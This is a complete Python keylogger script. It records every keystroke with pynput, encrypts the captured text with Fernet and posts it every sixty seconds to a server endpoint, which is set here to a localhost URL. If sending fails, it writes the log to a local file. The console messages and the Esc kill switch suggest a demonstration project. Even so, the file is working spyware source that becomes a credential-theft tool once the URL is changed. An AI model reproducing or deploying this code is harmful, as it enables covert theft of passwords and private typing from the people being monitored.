import os
import threading
import datetime
import requests
from pynput import keyboard
from cryptography.fernet import Fernet

LOG_FILE = "encrypted_keylog.log"  
KEY_FILE = "encryption.key"        
SERVER_URL = "http://127.0.0.1:5000/log"
REPORT_INTERVAL = 60 

class Keylogger:
    def __init__(self, interval, log_file, key_file):
        self.interval = interval
        self.log_file = log_file
        self.key_file = key_file
        self.log = ""
        self.fernet = self.load_or_generate_key()
        self.kill_switch = False

    def load_or_generate_key(self):
        if os.path.exists(self.key_file):
            with open(self.key_file, "rb") as f:
                key = f.read()
        else:
            print(f"Encryption key not found. Generating a new one at '{self.key_file}'")
            key = Fernet.generate_key()
            with open(self.key_file, "wb") as f:
                f.write(key)
        return Fernet(key)

    def encrypt_and_save_log(self, data):
        encrypted_data = self.fernet.encrypt(data.encode())
        with open(self.log_file, "ab") as f:
            f.write(encrypted_data + b'\n')
        print(f"[LOCAL] Log of {len(data)} characters saved to {self.log_file}")

    def append_to_log(self, key_str):
        self.log += key_str

    def on_press(self, key):
        try:
            key_str = str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                key_str = " "
            elif key == keyboard.Key.enter:
                key_str = "[ENTER]\n"
            elif key == keyboard.Key.tab:
                key_str = "[TAB]"
            elif key == keyboard.Key.backspace:
                self.log = self.log[:-1]
                key_str = ""
            elif key == keyboard.Key.esc:
                print("[INFO] Kill switch activated. Shutting down.")
                self.kill_switch = True
                return False
            else:
                key_str = f"[{str(key).split('.')[-1].upper()}]"
        
        self.append_to_log(key_str)

    def send_log_to_server(self):
        if not self.log:
            return

        try:
            data_to_send = self.log.encode()
            encrypted_data = self.fernet.encrypt(data_to_send)
            
            response = requests.post(SERVER_URL, data=encrypted_data, timeout=5)
            
            if response.status_code == 200:
                print(f"[SERVER] Successfully sent log to {SERVER_URL}")
                self.log = "" 
            else:
                print(f"[ERROR] Failed to send log. Server responded with {response.status_code}")
                self.save_log_locally(self.log)

        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Could not connect to the server: {e}")
            self.save_log_locally(self.log)

    def save_log_locally(self, data_to_save):
        if not data_to_save:
            return
        
        encrypted_log = self.fernet.encrypt(data_to_save.encode())
        with open(self.log_file, "ab") as f:
            f.write(encrypted_log + b'\n')
        print(f"[LOCAL] Log saved to {self.log_file} because sending failed or as a backup.")
        self.log = ""

    def report(self):
        if self.kill_switch:
            self.send_log_to_server()
            return

        self.send_log_to_server()
        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        print("[INFO] Keylogger started. Press 'Esc' to stop.")
        self.report()
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
        print("[INFO] Keylogger has been stopped.")

if __name__ == "__main__":
    keylogger = Keylogger(interval=REPORT_INTERVAL, log_file=LOG_FILE, key_file=KEY_FILE)
    keylogger.start()
